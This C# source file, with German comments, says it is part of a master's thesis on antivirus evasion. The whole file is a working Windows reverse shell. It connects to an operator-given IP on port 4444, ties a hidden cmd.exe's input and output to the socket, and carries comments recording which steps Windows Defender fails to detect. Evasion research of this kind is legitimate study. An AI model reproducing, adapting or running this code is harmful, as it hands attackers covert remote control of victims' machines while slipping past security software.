///----------------------------------------------------------------------------------------------------------------------------------------------------------------------
/// This implementation is part of my master's thesis regarding antivirus detection evasion. 
///  C Vorlage: https://github.com/izenynn/c-reverse-shell/blob/main/windows.c
///  C# Beispiel für Structs: https://pastebin.com/twvGw030
///----------------------------------------------------------------------------------------------------------------------------------------------------------------------
namespace SimpleReverseShell
{
  using System.Net.Sockets;
  using System.Runtime.InteropServices;

  public class SysCallShell
  {
    #region MemoryManagement
    [DllImport("kernel32.dll")]
    public static extern bool CreateProcessA(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation);

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_BASIC_INFORMATION
    {
      public IntPtr ExitStatus;
      public IntPtr PebAddress;
      public IntPtr AffinityMask;
      public IntPtr BasePriority;
      public IntPtr UniquePID;
      public IntPtr InheritedFromUniqueProcessId;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO
    {
      public Int32 cb;
      public string lpReserved;
      public string lpDesktop;
      public string lpTitle;
      public Int32 dwX;
      public Int32 dwY;
      public Int32 dwXSize;
      public Int32 dwYSize;
      public Int32 dwXCountChars;
      public Int32 dwYCountChars;
      public Int32 dwFillAttribute;
      public uint dwFlags;
      public Int16 wShowWindow;
      public Int16 cbReserved2;
      public IntPtr lpReserved2;
      public IntPtr hStdInput;
      public IntPtr hStdOutput;
      public IntPtr hStdError;
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
      public IntPtr hProcess;
      public IntPtr hThread;
      public int dwProcessId;
      public int dwThreadId;
    }

    public static class CreationFlags
    {
      public const uint SUSPENDED = 0x4;
      public const uint CREATE_NO_WINDOW = 0x8000000;
      public const uint STARTF_USESTDHANDLES = 0x100;
    }

    public static class StdHandle
    {
      public const int STD_INPUT_HANDLE = -10;
      public const int STD_OUTPUT_HANDLE = -11;
      public const int STD_ERROR_HANDLE = -12;
    }

    public const int PROCESSBASICINFORMATION = 0;
    #endregion


    #region Sockets
    /// <summary>
    /// Importierte Methode um Socket zu erzeugen.
    /// Dokumentation: https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasocketa
    /// </summary>
    /// <param name="af">Address family. Wert von 2 entspricht IPv4.</param>
    /// <param name="type">Socket Type. Wert von 1 entspricht stream.</param>
    /// <param name="protocol">Protokoll. Wert von 6 entspricht tcp.</param>
    /// <param name="protocolInfo">Kann NULL sein.</param>
    /// <param name="group">Kann NULL sein.</param>
    /// <param name="dwFlags">Kann NULL sein.</param>
    /// <returns></returns>
    [DllImport("Ws2_32.dll", SetLastError = true)]
    public static extern IntPtr WSASocketA(int af, int type, int protocol, IntPtr protocolInfo, int group, int dwFlags);

    [DllImport("Ws2_32.dll", SetLastError = true)]
    public static extern ushort htons(ushort port);

    /// <summary>
    /// Importierte Methode um ein Socket zu connecten.
    /// Dokumentation: https://learn.microsoft.com/de-de/windows/win32/api/winsock2/nf-winsock2-connect
    /// </summary>
    /// <param name="socket">Das Socket.</param>
    /// <param name="name">Pointer auf eine SockAddr Struktur. <see cref="https://learn.microsoft.com/de-de/windows/win32/winsock/sockaddr-2"/></param>
    /// <param name="namelen">Länge der Sockaddr Struktur</param>
    /// <returns></returns>
    [DllImport("Ws2_32.dll", SetLastError = true)]
    public static extern int connect(IntPtr socket, IntPtr name, int namelen);

    [DllImport("Ws2_32.dll", SetLastError = true)]
    public static extern uint inet_addr(string ipAddress);

    /// <summary>
    /// Fragt den letzten Fehlercode ab. Eine Referenz zu Fehlercodes: https://learn.microsoft.com/en-us/windows/win32/winsock/windows-sockets-error-codes-2
    /// </summary>
    /// <returns></returns>
    [DllImport("Ws2_32.dll")]
    public static extern int WSAGetLastError();

    /// <summary>
    /// Initialisiert die Sockets, dass diese verwendet werden können.
    /// </summary>
    /// <param name="maxVersionRequired">Die max Version der Spezifikation die benutzt wird.</param>
    /// <param name="WSAData">Pointer auf die WSAData Struktur.</param>
    /// Doku: https://learn.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup
    /// <returns></returns>
    [DllImport("Ws2_32.dll", SetLastError = true)]
    public static extern int WSAStartup(ushort maxVersionRequired, WSAData WSAData);

    [StructLayout(LayoutKind.Sequential)]
    public struct WSAData
    {
      ushort wVersion;
      ushort wHighVersion;
      ushort iMaxSockets;
      ushort iMaxUdpDg;
      IntPtr lpVendorInfo;
      byte[] szDescription;
      byte[] szSystemStatus;
      ushort iMaxUdpg;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct sockaddr_in
    {
      public short sin_family;

      public ushort sin_port;

      public in_addr sin_addr;

      [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 8)]
      public string sin_zero;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct in_addr
    {
      public uint S_addr;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct sockaddr
    {
      public ushort sa_family;

      [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 14)]
      public string sa_data;
    }
    #endregion

    public static void InitializeWSA()
    {
      var wsa = new WSAData();
      WSAStartup((ushort)2.2, wsa);
    }

    public static void PrintLastError(string method, bool throwIfError = false)
    {
      var lastError = WSAGetLastError();

      if (lastError != 0)
      {
        Console.WriteLine($"Last error in {method}: Error Code {lastError}");

        if (throwIfError)
          throw new InvalidOperationException();

        Console.ReadLine();
      }
      else
        Console.WriteLine($"Method {method} completed without errors");
    }

    public static string GetIP()
    {
      var ip = Environment.GetEnvironmentVariable("MA_ServerIP", EnvironmentVariableTarget.User);

      if (string.IsNullOrWhiteSpace(ip))
      {
        Console.WriteLine("Enter IP: ");
        ip = Console.ReadLine();
      }

      return ip;
    }

    public void Main(string[] args)
    {
      Console.WriteLine("Hello World");
      InitializeWSA();
      var ip = GetIP();
      Start(ip);

      var sockAddrIn = new sockaddr_in();
      sockAddrIn.sin_family = 2;
      sockAddrIn.sin_port = htons(4444);
      PrintLastError(nameof(htons));

      sockAddrIn.sin_addr.S_addr = inet_addr(ip);
      PrintLastError(nameof(inet_addr));

      var sockAddrInPtr = Marshal.AllocHGlobal(Marshal.SizeOf(sockAddrIn));
      Marshal.StructureToPtr(sockAddrIn, sockAddrInPtr, false);

      var sockAddr = Marshal.PtrToStructure<sockaddr>(sockAddrInPtr);

      var socket = WSASocketA(2, 1, 6, IntPtr.Zero, 0, 0);
      PrintLastError(nameof(WSASocketA));
      string socketToString = "";
      var intRepresentationSocket = socket.ToInt64();
      Console.WriteLine("not detected");

      // Socket in Registry schreiben
      //Environment.SetEnvironmentVariable("TESTTESTTEST", intRepresentationSocket.ToString(), EnvironmentVariableTarget.User);
      //Console.WriteLine("Socket in Registry serialisiert");

      // Socket in File schreiben
      //File.WriteAllText("test.txt", intRepresentationSocket.ToString());
      //Console.WriteLine("Socket serialisiert ohne detection");
      //var serialized = Environment.GetEnvironmentVariable("TESTTESTTEST", EnvironmentVariableTarget.User);
      //var testPtr = new IntPtr(long.Parse(serialized));
      //socket = IntPtr.Zero;
      //socket = testPtr;

      var addrPointer = Marshal.AllocHGlobal(Marshal.SizeOf(sockAddr));
      Marshal.StructureToPtr(sockAddr, addrPointer, false);
      var connectSuccess = connect(socket, sockAddrInPtr, Marshal.SizeOf(sockAddrIn));
      PrintLastError(nameof(connect));

      var socketHandle = new SafeSocketHandle(socket, false);
      STARTUPINFO startupInfo = new STARTUPINFO();
      Marshal.AllocHGlobal(Marshal.SizeOf(startupInfo));
      startupInfo.cb = Marshal.SizeOf(startupInfo);
      startupInfo.dwFlags = CreationFlags.STARTF_USESTDHANDLES;
      startupInfo.hStdInput = socketHandle.DangerousGetHandle();
      startupInfo.hStdOutput = socketHandle.DangerousGetHandle();
      startupInfo.hStdError = socketHandle.DangerousGetHandle();


      // ALLES BIS HIER WIRD VOM DEFENDER NICHT ERKANNT
      PROCESS_INFORMATION pinfo = new PROCESS_INFORMATION();
      CreateProcessA(null, @"C:\\Windows\\System32\\cmd.exe", IntPtr.Zero, IntPtr.Zero, true, CreationFlags.CREATE_NO_WINDOW, IntPtr.Zero, null, ref startupInfo, ref pinfo);
      //Helpers.PrintLastError(nameof(CreateProcessA));
      //Console.WriteLine("TestTEstTEst");

      Console.WriteLine("Not detected");
    }

    public static void Start(string serverIP)
    {
      var sockAddrIn = new sockaddr_in();
      sockAddrIn.sin_family = 2;
      sockAddrIn.sin_port = htons(4444);
      PrintLastError(nameof(htons));

      if (string.IsNullOrWhiteSpace(serverIP))
      {
        Console.WriteLine("Enter server IP: ");
        serverIP = Console.ReadLine();
      }

      sockAddrIn.sin_addr.S_addr = inet_addr(serverIP);
      PrintLastError(nameof(inet_addr));

      var sockAddrInPtr = Marshal.AllocHGlobal(Marshal.SizeOf(sockAddrIn));
      Marshal.StructureToPtr(sockAddrIn, sockAddrInPtr, false);

      var sockAddr = Marshal.PtrToStructure<sockaddr>(sockAddrInPtr);

      var socket = WSASocketA(2, 1, 6, IntPtr.Zero, 0, 0);
      PrintLastError(nameof(WSASocketA));

      var addrPointer = Marshal.AllocHGlobal(Marshal.SizeOf(sockAddr));
      Marshal.StructureToPtr(sockAddr, addrPointer, false);
      var connectSuccess = connect(socket, sockAddrInPtr, Marshal.SizeOf(sockAddrIn));
      PrintLastError(nameof(connect));

      var socketHandle = new SafeSocketHandle(socket, false);
      STARTUPINFO startupInfo = new STARTUPINFO();
      Marshal.AllocHGlobal(Marshal.SizeOf(startupInfo));
      startupInfo.cb = Marshal.SizeOf(startupInfo);
      startupInfo.dwFlags = CreationFlags.STARTF_USESTDHANDLES;
      startupInfo.hStdInput = socketHandle.DangerousGetHandle();
      startupInfo.hStdOutput = socketHandle.DangerousGetHandle();
      startupInfo.hStdError = socketHandle.DangerousGetHandle();
      PROCESS_INFORMATION pinfo = new PROCESS_INFORMATION();
      CreateProcessA(null, @"C:\\Windows\\System32\\cmd.exe", IntPtr.Zero, IntPtr.Zero, true, CreationFlags.CREATE_NO_WINDOW, IntPtr.Zero, null, ref startupInfo, ref pinfo);
      PrintLastError(nameof(CreateProcessA));
    }
  }
}
